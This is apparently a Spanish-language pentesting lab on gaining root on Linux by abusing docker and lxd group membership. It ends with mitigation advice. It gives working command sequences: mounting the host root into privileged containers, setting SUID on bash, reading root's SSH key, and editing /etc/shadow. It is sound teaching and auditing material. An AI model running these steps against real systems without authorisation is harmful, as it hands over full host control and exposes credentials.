
---
# Laboratorio: Abuso de Grupos de Usuario Especiales

---

## ¿Qué son los grupos en Linux?

> En sistemas Linux, los grupos son una forma de organizar usuarios para otorgar permisos compartidos sobre recursos del sistema, como archivos, dispositivos o servicios. Cada usuario puede pertenecer a uno o más grupos, y cada grupo puede tener distintos privilegios asignados.

Existen grupos tradicionales, como `adm`, `sudo`, `www-data`, y también **grupos especiales**, diseñados para permitir el uso de herramientas concretas, como:

- `docker`
- `lxd`
- `libvirt`
- `kvm`
- `plugdev`

Si un usuario sin privilegios obtiene acceso a alguno de estos grupos, podría explotar ese acceso para **escalar privilegios** en el sistema.

---

## Caso de estudio: grupo `docker`

Cuando un usuario forma parte del grupo `docker`, tiene la capacidad de gestionar contenedores. Esto, en la práctica, le permite ejecutar contenedores con acceso completo al sistema de archivos del host.

### Comprobación

Podemos comprobar si pertenecemos a un grupo especial con:

```bash
id
````

Salida de ejemplo:

```
uid=1001(pentester) gid=1001(pentester) groups=1001(pentester),998(docker)
```

Vemos que el usuario forma parte del grupo `docker`.

---

## Abuso de Docker para escalar privilegios

Docker ejecuta sus procesos como root. Si el usuario tiene acceso a la CLI de Docker, puede iniciar contenedores con acceso al sistema host.

### Paso 1: Crear un contenedor con el sistema de archivos montado

```bash
docker run -it --rm -v /:/mnt --privileged ubuntu chroot /mnt
```

Este comando hace lo siguiente:

- Ejecuta un contenedor de Ubuntu (`docker run -it ubuntu`)
    
- Monta el sistema de archivos raíz `/` del host en `/mnt` dentro del contenedor (`-v /:/mnt`)
    
- Usa `chroot` para cambiar el entorno raíz al del host (`chroot /mnt`)
    
- Ejecuta el contenedor como root (`--privileged`)
    

### Paso 2: Confirmar acceso como root

Una vez dentro del contenedor, ejecutamos:

```bash
whoami
```

Resultado:

```
root
```

Hemos escalado privilegios a root en el host a través del contenedor.

---

## Otras variantes de ataque con grupos especiales

### Grupo `lxd`

Los usuarios del grupo `lxd` pueden importar imágenes de contenedores LXC. Una técnica común es:

1. Importar una imagen con un sistema básico (ej. Alpine)
    
2. Montar el sistema de archivos del host
    
3. Obtener una shell con permisos de root
    

Existen herramientas como `lxd-exploit.sh` que automatizan este proceso.


### Ejemplo práctico: Abusando del grupo `lxd` para escalar privilegios

---

#### ¿Qué es el grupo `lxd`?

El grupo `lxd` está asociado con el daemon de LXD, un sistema de gestión de contenedores basado en LXC. Si un usuario forma parte del grupo `lxd`, puede interactuar con la interfaz de LXD sin necesidad de privilegios de superusuario. Esta capacidad, aunque conveniente, puede ser peligrosa: un usuario no privilegiado puede obtener acceso root en el host si abusa de LXD de forma maliciosa.

---

#### Riesgo de pertenecer al grupo `lxd`

Si un atacante tiene acceso a una cuenta en el sistema que pertenece al grupo `lxd`, puede:

- Crear un contenedor controlado por él.
    
- Montar el sistema de archivos del host dentro del contenedor.
    
- Acceder a recursos sensibles del host (por ejemplo, `/root`, `/etc/shadow`).
    
- Incluso modificar archivos del sistema y obtener una shell como `root`.
    

---

#### Paso a paso: Escalada de privilegios usando `lxd`

##### Acción:

Verificamos si pertenecemos al grupo `lxd`:

```bash
id
```

#### Resultado:

```bash
uid=1001(gramscixi) gid=1001(gramscixi) groups=1001(gramscixi),999(lxd)
```

---

#### Explicación:

Pertenecemos al grupo `lxd`, lo cual nos permite interactuar con el daemon de contenedores sin necesidad de `sudo`.

---

#### Acción:

Subimos una imagen contenedor vulnerable que montaremos con acceso al sistema host. Usamos una imagen `alpine` o una preparada como [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine
```

Esto nos genera un archivo `.tar.gz` con la imagen.

---

#### Acción:

Importamos la imagen al sistema:

```bash
lxc image import ./alpine-v3.17-*.tar.gz --alias myalpine
```

Creamos un contenedor:

```bash
lxc init myalpine pwned -c security.privileged=true
```

Montamos el sistema de archivos del host dentro del contenedor:

```bash
lxc config device add pwned mydevice disk source=/ path=/mnt/root recursive=true
```

Iniciamos el contenedor:

```bash
lxc start pwned
```

Entramos al contenedor:

```bash
lxc exec pwned /bin/sh
```

---

#### Resultado:

Dentro del contenedor tenemos acceso como root:

```bash
~ # id
uid=0(root) gid=0(root) groups=...
```

Y podemos acceder a `/mnt/root`, que corresponde al sistema de archivos del host.

---

#### Escalada final:

Una vez dentro, podemos hacer cualquiera de estas acciones:

- Leer archivos sensibles como `/mnt/root/root/.ssh/id_rsa`.
    
- Copiar `/bin/bash` y darle SUID en el host.
    
- Modificar archivos críticos para mantener acceso persistente.
    

---

### Recomendaciones

- Evitar añadir usuarios no privilegiados al grupo `lxd`.
    
- Controlar estrictamente quién tiene permisos para ejecutar contenedores.
    
- Auditar los grupos con herramientas como `lse`, `linpeas` o `id`.
    

---

### Resumen

El grupo `lxd`, aunque útil para tareas de contenedores, representa un riesgo elevado si se concede a usuarios no confiables. Como hemos visto, su abuso permite montar el sistema de archivos del host y escalar privilegios hasta `root` con relativa facilidad.


---

## Mitigación

Para reducir el riesgo asociado al abuso de estos grupos:

- Revisar periódicamente los usuarios pertenecientes a grupos como `docker`, `lxd`, `libvirt`, `kvm`, etc.
    
- Aplicar el principio de **mínimos privilegios**: solo deben tener acceso quienes realmente lo necesiten.
    
- Monitorizar el uso de herramientas como Docker y LXC.
    
- Configurar alertas para la creación de contenedores privilegiados.
    
- Deshabilitar el socket de Docker (`/var/run/docker.sock`) si no es estrictamente necesario.
    

---

## Conclusión

La pertenencia a grupos especiales en Linux puede tener implicaciones de seguridad mucho mayores de lo que parece a simple vista. En este laboratorio hemos comprobado cómo un usuario con acceso al grupo `docker` puede obtener acceso root al host mediante un contenedor.

Como administradores y como pentesters, debemos tener claro que estos grupos **deben tratarse como equivalentes a `sudo` o `root`**, y aplicar las medidas de control y auditoría correspondientes.

---

# Ejemplo práctico: Escalada de privilegios abusando del grupo `docker`

---

## ¿Qué implica pertenecer al grupo `docker`?

En sistemas Linux, los usuarios del grupo `docker` pueden ejecutar contenedores sin necesidad de permisos de superusuario. Aunque esto facilita la gestión de contenedores, representa un grave riesgo de seguridad: **cualquier usuario que pertenezca a este grupo puede escalar a `root` en el sistema host** si se aprovecha correctamente de las opciones de montaje (`--mount` o `-v`) al crear contenedores.

---

## Paso a paso: Montar la raíz del host dentro de un contenedor

### Acción:

Verificamos si pertenecemos al grupo `docker`:

```bash
id
```

### Resultado:

```bash
uid=1001(gramscixi) gid=1001(gramscixi) groups=1001(gramscixi),998(docker)
```

---

### Explicación:

El grupo `docker` nos permite lanzar contenedores con control total sobre sus parámetros. Aprovecharemos esto para **montar el sistema de archivos `/` del host en el contenedor**.

---

### Acción:

Ejecutamos un contenedor interactivo y le montamos `/` del host en `/mnt` del contenedor:

```bash
docker run -it --rm \
  -v /:/mnt \
  --privileged \
  ubuntu /bin/bash
```

---

### Explicación:

- `-v /:/mnt`: monta la raíz del host en `/mnt` del contenedor.
    
- `--privileged`: da privilegios elevados al contenedor (por ejemplo, acceso a `/dev`, `CAP_SYS_ADMIN`, etc.).
    
- `ubuntu`: usamos una imagen simple y confiable.
    

---

### Resultado:

Dentro del contenedor tenemos acceso al sistema de archivos del host:

```bash
root@container:/# ls /mnt
bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Y podemos, por ejemplo, entrar a la carpeta `/mnt/root` (directorio personal del `root` del host):

```bash
cd /mnt/root
```

---

## Escalada de privilegios

Desde aquí, podemos usar múltiples técnicas para conseguir una shell como `root` en el host. Algunas opciones son:

### Opción 1: Añadir SUID a `/bin/bash` en el host

```bash
chmod +s /mnt/bin/bash
```

Luego, fuera del contenedor:

```bash
bash -p
```

### Opción 2: Inyectar una clave SSH en `/mnt/root/.ssh/authorized_keys` si existe.

### Opción 3: Modificar `/mnt/etc/shadow` o `passwd`.

---

## Recomendaciones

- Nunca asignar el grupo `docker` a usuarios sin privilegios.
    
- Recordar que **pertenecer a `docker` equivale a tener acceso root** si el usuario es malintencionado.
    
- Monitorear los contenedores lanzados y los volúmenes montados.
    

---

## Resumen

Hemos demostrado que pertenecer al grupo `docker` es suficiente para comprometer completamente un sistema si no se aplican restricciones adicionales. Aprovechando monturas y el flag `--privileged`, podemos acceder como root a todo el sistema de archivos y ejecutar acciones con impacto total en la seguridad del host.

---

